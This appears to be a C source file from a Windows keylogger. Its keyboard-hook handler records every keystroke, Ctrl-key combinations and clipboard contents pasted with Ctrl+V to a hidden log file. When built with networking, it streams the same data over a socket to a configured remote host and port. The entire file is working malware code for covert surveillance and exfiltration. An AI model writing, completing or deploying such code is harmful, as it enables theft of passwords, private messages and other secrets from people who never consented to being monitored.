#include "util/clipboard.h"
#include "util/file.h"
#include "util/keyboard.h"
#include "config.h"
#include "constants.h"
#include "keylogger.h"
#include "networking.h"
#include <stdio.h>

DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook) 
{
	if (is_ignored(kbd_hook->vkCode))
		return 1;

	static HANDLE out_file = NULL;
	static SOCKET out_sock = NULL;
	static unsigned int count_handles = 0;

	DWORD rc = 0;
	DWORD rc_sock = 0;

	if (!out_file) {
		rc = open_utf16_file(&out_file, OUT_FILE);

		if (rc)
			return rc;
	}
#ifdef USE_NETWORK
	if (!out_sock && (count_handles % 600 == 0)) {
		out_sock = get_socket_file_descriptor(HOST, PORT);
	}
#endif // USE_NETWORK


	count_handles++;

	LPCWSTR vk_val = get_virtual_key_value(kbd_hook->vkCode);

	if (vk_val != NULL) {
		rc = write_wstr(out_file, vk_val);
	} else if (is_key_down(VK_CONTROL)) {
		WCHAR ctrl[] = L"[CTRL + %c]";
		swprintf_s(ctrl, ARRAYSIZE(ctrl), ctrl, 
			   (CHAR)kbd_hook->vkCode);
		rc = write_wstr(out_file, ctrl);
#ifdef USE_NETWORK
		if (out_sock) {
			send_message(ctrl, out_sock);
		}
#endif // USE_NETWORK
		
		if (!rc && kbd_hook->vkCode == VK_V) {
			rc = write_clipboard_data(out_file);
#ifdef USE_NETWORK
			if (out_sock) {
				rc_sock = send_clipboard_data(out_sock);
			}
#endif // USE_NETWORK
		}
	} else {
		WCHAR key_buff[KEY_BUFFER_SIZE];
		int count = kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE);

		if (count > 0) {
			rc = write_wstr(out_file, key_buff);
#ifdef USE_NETWORK
			if (out_sock) {
				rc_sock = send_message(key_buff, out_sock);
			}
#endif // USE_NETWORK
		}
	}
#ifdef USE_NETWORK
	if (rc_sock) {
		out_sock = NULL;
	}
#endif // USE_NETWORK

	return rc;
}

BOOL is_ignored(const DWORD vk_code)
{
	switch (vk_code) {
	case VK_LCONTROL:
	case VK_RCONTROL:
	case VK_CONTROL:
		return TRUE;
	default:
		return FALSE;
	}
}

LPCWSTR get_virtual_key_value(const DWORD vk_code)
{
	switch (vk_code) {
	case VK_RETURN:
		return L"\r\n";
	case VK_ESCAPE:
		return L"[ESC]";
	case VK_BACK:
		return L"[BACKSPACE]";
	default:
		return NULL;
	}
}
